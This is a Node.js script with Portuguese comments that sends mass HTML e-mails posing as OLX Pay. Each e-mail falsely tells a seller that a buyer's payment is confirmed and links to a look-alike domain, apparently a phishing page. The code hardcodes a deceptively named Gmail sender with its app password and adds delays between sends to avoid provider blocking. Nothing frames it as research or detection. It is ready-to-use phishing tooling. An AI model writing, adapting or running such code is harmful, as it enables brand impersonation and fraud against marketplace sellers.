const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

// Configuração do transporte SMTP
const transporter = nodemailer.createTransport({
  service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
  auth: {
    user: "newsoixpay.com.br.grupoolx.com.br@gmail.com", // seu email
    pass: "gphz ropb cvyu gcqz", // sua senha ou senha de app
  },
});

/**
 * Função para enviar e-mail
 * @param {string} destinatario - e-mail do destinatário
 * @param {string} assunto - assunto do e-mail
 * @param {string} htmlConteudo - conteúdo em HTML do e-mail
 */
async function enviarEmail(destinatario, assunto, htmlConteudo) {
  const mailOptions = {
    from: '"OLX" <newsoixpay.com.br.grupoolx.com.br@gmail.com>', // remetente
    to: destinatario,
    subject: assunto,
    html: htmlConteudo,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email enviado para ${destinatario}: ${info.messageId}`);
    return true;
  } catch (error) {
    console.error(`❌ Erro ao enviar email para ${destinatario}:`, error);
    return false;
  }
}

/**
 * Função para carregar dados de vendas do arquivo JSON
 * @returns {Array} Array com dados de vendas
 */
function carregarDadosVendas() {
  try {
    const caminhoArquivo = path.join(__dirname, "../data/vendas.json");
    const dados = fs.readFileSync(caminhoArquivo, "utf8");
    return JSON.parse(dados);
  } catch (error) {
    console.error("Erro ao carregar dados de vendas:", error);
    return [];
  }
}

/**
 * Função para enviar e-mails em massa para uma lista de destinatários
 * @param {Array} listaEmails - lista de e-mails destinatários
 * @param {string} codigoProduto - (opcional) código específico do produto
 * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
 */
async function enviarEmMassa(
  listaEmails,
  codigoProduto = null,
  assuntoPersonalizado = null
) {
  // Carregar dados de vendas
  const dadosVendas = carregarDadosVendas();

  if (dadosVendas.length === 0) {
    console.error(
      "Não foi possível carregar dados de produtos para o envio em massa"
    );
    return;
  }

  // Se não foi especificado um código, usa o primeiro produto na lista
  const produto = codigoProduto
    ? dadosVendas.find((p) => p.codigo === codigoProduto)
    : dadosVendas[0];

  if (!produto) {
    console.error(`Produto com código ${codigoProduto} não encontrado`);
    return;
  }

  // Informações para o e-mail
  const codigoVenda = produto.codigo;
  const nomeProduto = produto.produto;
  const valorProduto = produto.valor;
  const nomeComprador = produto.comprador;

  const linkProduto = `https://olxvendasegura.shop/pag/?id=${codigoVenda}`;

  // Contadores para estatísticas
  let enviados = 0;
  let falhas = 0;

  // Assunto do e-mail
  const assunto =
    assuntoPersonalizado ||
    `OLX Pay - Confirmação de Pagamento para ${nomeProduto}`;

  console.log(
    `Iniciando envio em massa para ${listaEmails.length} destinatários...`
  );
  console.log(`Produto: ${nomeProduto} (${codigoVenda})`);

  // Enviar para cada e-mail da lista
  for (const email of listaEmails) {
    // Template do e-mail com link personalizado
    const mensagemHTML = `<div style="max-width:600px; margin:auto; background:#ffffff; padding:20px; font-family:Arial, sans-serif;">

  <div style="text-align:center; margin-bottom:20px;">
    <img src="https://play-lh.googleusercontent.com/FHJT9Msv-P2k0eqJhf61JBLdV_FLw1Apiar9A3FjaF4rB9hysQTxkLky1odU818n0sI=w240-h480-rw" alt="OLX Logo" style="height:50px;">
  </div>

  <p style="text-align:center; color:#7027f9; font-size:12px; margin:0;">
    Carros • Imóveis • Eletrônicos • Móveis
    <span style="background-color:#f78002; color:#fff; padding:2px 8px; border-radius:10px; margin-left:8px; font-size:11px;">Baixar o App</span>
  </p>

  <h2 style="text-align:center; color:#7027f9; margin-top:20px;">
    📨 Pagamento Confirmado
  </h2>

  <p style="text-align:center; color:#3c3c3c; font-size:15px;">
    Recebemos seu pagamento com <strong>sucesso</strong>! Agora você deve <strong>providenciar o envio do produto</strong> para <strong>${nomeComprador}</strong>.
  </p>

  <div style="text-align:center; margin:25px 0;">
    <a href="${linkProduto}" target="_blank"
       style="background-color:#f78002; color:white; text-decoration:none; padding:12px 24px; border-radius:30px; display:inline-block; font-weight:bold;">
      Verificar pedido
    </a>
  </div>

  <hr style="border:none; border-top:1px solid #e5e5e5; margin:20px 0;">

  <h3 style="color:#7027f9;">Vantagens de enviar com a OLX</h3>

  <ul style="padding-left:18px; color:#3c3c3c; font-size:15px; line-height:1.6;">
    <li><strong style="color:#f78002;">Pagamento garantido</strong>: o valor já está reservado.</li>
    <li>O valor será <strong style="color:#f78002;">liberado automaticamente</strong> após a confirmação da entrega.</li>
    <li>Suporte OLX disponível durante todo o processo.</li>
  </ul>

  <hr style="border:none; border-top:1px solid #e5e5e5; margin:20px 0;">

  <p style="color:#3c3c3c; font-size:15px; line-height:1.6;">
    Se tiver qualquer dúvida, acesse nossa 
    <a href="newsoixpay.com.br.grupoolx.com.br@gmail.com" target="_blank" style="color:#7027f9; text-decoration:none;"><strong>Central de Ajuda</strong></a> 
    ou entre em contato com nosso suporte.
  </p>

  <div style="text-align:center; margin-top:30px;">
    <a href="#" style="color:#7027f9; text-decoration:none; margin:0 10px;">Verificar e-mail</a> |
    <a href="#" style="color:#7027f9; text-decoration:none; margin:0 10px;">Verificar telefone</a> |
    <a href="#" style="color:#7027f9; text-decoration:none; margin:0 10px;">Conectar Facebook</a>
  </div>

  <p style="text-align:center; color:#777; font-size:12px; margin-top:20px;">
    OLX Entregas Seguras • Todos os direitos reservados
  </p>

</div>`;

    // Enviar e-mail
    const resultado = await enviarEmail(email, assunto, mensagemHTML);

    if (resultado) {
      enviados++;
    } else {
      falhas++;
    }

    // Pequeno delay para evitar bloqueios do servidor de e-mail
    await new Promise((resolve) => setTimeout(resolve, 1500));
  }

  console.log(`
  ✅ Envio em massa concluído:
  - E-mails enviados com sucesso: ${enviados}
  - Falhas no envio: ${falhas}
  - Total de tentativas: ${listaEmails.length}
  `);
}

// Exportar funções
module.exports = {
  enviarEmail,
  enviarEmMassa,
  carregarDadosVendas,
};

// Descomentar para testar
// teste();
// testarEnvioEmMassa();
